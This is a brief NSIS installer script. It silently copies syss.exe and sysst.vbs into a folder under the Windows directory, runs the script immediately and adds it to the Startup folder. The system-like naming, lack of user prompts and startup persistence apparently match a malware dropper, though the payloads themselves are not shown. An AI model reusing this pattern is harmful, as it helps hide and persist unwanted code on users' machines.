OutFile "installerV1.3.exe"

InstallDir $WINDIR\syss

Section
CreateDirectory $WINDIR\syss

SetOutPath $INSTDIR

File syss.exe
File sysst.vbs

ExecShell "" $INSTDIR\sysst.vbs
CreateShortCut $SMPROGRAMS\Startup\sysst.lnk $INSTDIR\sysst.vbs ""
 
SectionEnd